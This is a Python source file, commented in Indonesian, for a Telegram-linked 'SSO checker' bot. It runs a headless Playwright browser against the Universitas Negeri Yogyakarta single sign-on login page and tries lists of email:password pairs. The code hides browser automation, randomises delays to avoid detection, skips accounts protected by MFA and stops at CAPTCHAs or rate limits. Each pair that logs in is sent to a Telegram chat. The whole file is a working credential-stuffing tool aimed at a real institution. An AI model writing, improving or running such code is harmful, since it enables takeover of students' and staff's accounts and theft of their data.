"""
SSO Checker Bot Integration - Playwright Version
Wrapper untuk SSO UNY checker dengan callback ke Telegram
Optimized untuk Railway Hobby Plan (8GB RAM)
"""

from playwright.sync_api import sync_playwright
import time
import os
import random
from datetime import datetime


class SSOCheckerBot:
    """SSO Checker dengan integrasi Telegram Bot - Playwright"""
    
    def __init__(self, credentials, chat_id, bot):
        self.credentials = credentials
        self.chat_id = chat_id
        self.bot = bot
        self.success_list = []
        self.failed_list = []
        self.playwright = None
        self.browser = None
        self.context = None
        self.page = None
    
    def setup_browser(self):
        """Setup Playwright Chromium browser (headless)"""
        self.playwright = sync_playwright().start()
        
        self.browser = self.playwright.chromium.launch(
            headless=True,
            args=[
                '--no-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--disable-blink-features=AutomationControlled',
            ]
        )
        
        self.context = self.browser.new_context(
            viewport={'width': 1920, 'height': 1080},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        )
        
        self.page = self.context.new_page()
        
        # Anti-detection
        self.page.add_init_script("""
            Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
        """)
        
        print("✅ Playwright Chromium browser initialized")
    
    def detect_mfa(self):
        """Deteksi MFA/2FA berdasarkan halaman SSO UNY"""
        try:
            current_url = self.page.url.lower()
            page_source = self.page.content().lower()
            
            # URL-based detection
            mfa_url_keywords = ['mfa', '2fa', 'verify', 'verification', 'authenticator']
            if any(keyword in current_url for keyword in mfa_url_keywords):
                return True, "MFA detected in URL"
            
            # Text-based detection (Indonesian + English)
            mfa_text_keywords = [
                'perangkat mfa yang terdaftar',
                'silakan masukkan token',
                'masukkan token yang diperoleh',
                'google authenticator',
                'verification code',
                'enter code',
                'two-factor',
                'multi-factor',
                'verifikasi dua langkah',
                'kode verifikasi',
                'enter the code',
                'authentication code'
            ]
            
            for keyword in mfa_text_keywords:
                if keyword in page_source:
                    return True, f"MFA detected: {keyword}"
            
            # Element-based detection
            try:
                mfa_selectors = [
                    "input[name*='token' i]", "input[name*='code' i]", "input[name*='otp' i]",
                    "input[id*='token' i]", "input[id*='code' i]", "input[id*='otp' i]",
                    "input[placeholder*='token' i]", "input[placeholder*='code' i]", "input[placeholder*='otp' i]"
                ]
                for selector in mfa_selectors:
                    el = self.page.query_selector(selector)
                    if el and el.is_visible():
                        return True, "MFA input field detected"
            except:
                pass
            
            return False, "No MFA detected"
            
        except Exception as e:
            return False, f"MFA check error: {str(e)}"
    
    def check_login(self, email, password, index, total):
        """Check login untuk satu kredensial"""
        try:
            # Send progress to Telegram
            progress_msg = f"🔍 *[{index}/{total}]* Checking: `{email}`"
            self.bot.send_message(self.chat_id, progress_msg, parse_mode='Markdown')
            
            # Clear session
            self.context.clear_cookies()
            self.page.goto("https://sso.uny.ac.id", wait_until="domcontentloaded", timeout=15000)
            
            wait_time = random.uniform(1, 2)
            time.sleep(wait_time)
            
            # Detect CAPTCHA
            try:
                captcha_selectors = [
                    "iframe[src*='recaptcha']",
                    "iframe[src*='hcaptcha']",
                    "iframe[src*='captcha']"
                ]
                for selector in captcha_selectors:
                    captcha = self.page.query_selector(selector)
                    if captcha and captcha.is_visible():
                        error_msg = "🚨 CAPTCHA terdeteksi! Bot dihentikan."
                        self.bot.send_message(self.chat_id, error_msg)
                        return False, "CAPTCHA terdeteksi"
            except:
                pass
            
            # Check rate limiting
            page_text = self.page.content().lower()
            if 'too many requests' in page_text or 'rate limit' in page_text:
                error_msg = "🚨 Rate limit! Bot dihentikan. Tunggu beberapa menit."
                self.bot.send_message(self.chat_id, error_msg)
                return False, "Rate limit exceeded"
            
            # Fill form
            try:
                # Email field
                email_field = self.page.locator("input[name='username'], input[type='text']").first
                email_field.fill(email)
                time.sleep(0.3)
                
                # Password field
                password_field = self.page.locator("input[name='password'], input[type='password']").first
                password_field.fill(password)
                time.sleep(0.3)
                
                # Click login
                login_button = self.page.locator("button[type='submit'], input[type='submit']").first
                
                try:
                    login_button.click()
                except:
                    try:
                        self.page.evaluate("document.querySelector(\"button[type='submit'], input[type='submit']\").click()")
                    except:
                        email_field.press("Enter")
                
                # Wait for navigation/response
                try:
                    self.page.wait_for_load_state("networkidle", timeout=8000)
                except:
                    time.sleep(2)
                
                # Auto-dismiss alerts via dialog handler (Playwright handles this differently)
                # Playwright auto-dismisses dialogs by default, but we can set handler
                
                # Try clicking OK buttons on modals
                try:
                    ok_button = self.page.locator("button:has-text('OK'), button:has-text('Ok'), button[aria-label='OK']").first
                    if ok_button.is_visible(timeout=1000):
                        ok_button.click()
                        time.sleep(1)
                except:
                    pass
                
                # Press Escape to dismiss any popups
                try:
                    self.page.keyboard.press("Escape")
                    time.sleep(0.2)
                except:
                    pass
                
                # Check result
                current_url = self.page.url
                page_source = self.page.content().lower()
                
                # ** CRITICAL: Check MFA FIRST before success validation **
                mfa_detected, mfa_reason = self.detect_mfa()
                if mfa_detected:
                    return False, f"MFA/2FA required ({mfa_reason})"
                
                # Fail indicators
                fail_keywords = [
                    'autentikasi gagal', 'authentication failed',
                    'invalid username or password', 'invalid credentials',
                    'incorrect', 'gagal login', 'login failed',
                    "couldn't sign you in", 'hubungi admin domain'
                ]
                
                # Success indicators
                success_keywords = [
                    'dashboard', 'logout', 'beranda', 'profile',
                    'welcome', 'home', 'berhasil', 'selamat',
                    'sign out', 'keluar'
                ]
                
                sso_success_markers = [
                    'berhasil masuk', 'selamat', 'single sign on uny',
                    'webmail', 'siakad', 'registrasi', 'besmart'
                ]
                
                # Check Google error page
                if 'accounts.google.com' in current_url and ('error' in current_url.lower() or 'signin' in current_url.lower()):
                    return False, "Google error page"
                
                # Check fail keywords
                for keyword in fail_keywords:
                    if keyword in page_source:
                        return False, f"Autentikasi gagal: {keyword}"
                
                # Check SSO success markers
                marker_hits = [m for m in sso_success_markers if m in page_source]
                if len(marker_hits) >= 2:
                    return True, f"Login berhasil (SSO: {marker_hits[0]})"
                
                # Check success keywords
                for keyword in success_keywords:
                    if keyword in current_url.lower() or keyword in page_source:
                        return True, f"Login berhasil: {keyword}"
                
                # Check redirect
                if current_url != "https://sso.uny.ac.id" and 'google.com' not in current_url:
                    return True, "Login berhasil (redirect)"
                
                # Still at login page
                if ('sso.uny.ac.id' in current_url or 'login' in current_url.lower()) and len(marker_hits) < 2:
                    return False, "Masih di halaman login"
                
                return False, "Tidak ada indikator sukses"
                
            except Exception as e:
                return False, f"Element tidak ditemukan: {str(e)}"
        
        except Exception as e:
            return False, str(e)
    
    def start_checking(self):
        """Mulai proses checking semua kredensial"""
        try:
            # Setup browser
            self.bot.send_message(self.chat_id, "🚀 Memulai browser (Playwright)...")
            self.setup_browser()
            
            # Set dialog handler (auto-dismiss alerts)
            self.page.on("dialog", lambda dialog: dialog.accept())
            
            total = len(self.credentials)
            
            for idx, (email, password) in enumerate(self.credentials, 1):
                success, message = self.check_login(email, password, idx, total)
                
                if success:
                    self.success_list.append((email, password, message))
                    
                    # SEND REAL-TIME NOTIFICATION
                    success_msg = f"✅ *BERHASIL!*\n`{email}:{password}`"
                    self.bot.send_message(self.chat_id, success_msg, parse_mode='Markdown')
                else:
                    self.failed_list.append((email, password, message))
                    
                    # Stop if CAPTCHA or rate limit
                    if 'CAPTCHA' in message or 'Rate limit' in message:
                        break
                
                # Delay between attempts
                if idx < total:
                    wait_time = random.uniform(0.5, 1.5)
                    time.sleep(wait_time)
        
        finally:
            self.cleanup()
    
    def cleanup(self):
        """Cleanup browser resources"""
        try:
            if self.page:
                self.page.close()
            if self.context:
                self.context.close()
            if self.browser:
                self.browser.close()
            if self.playwright:
                self.playwright.stop()
        except:
            pass
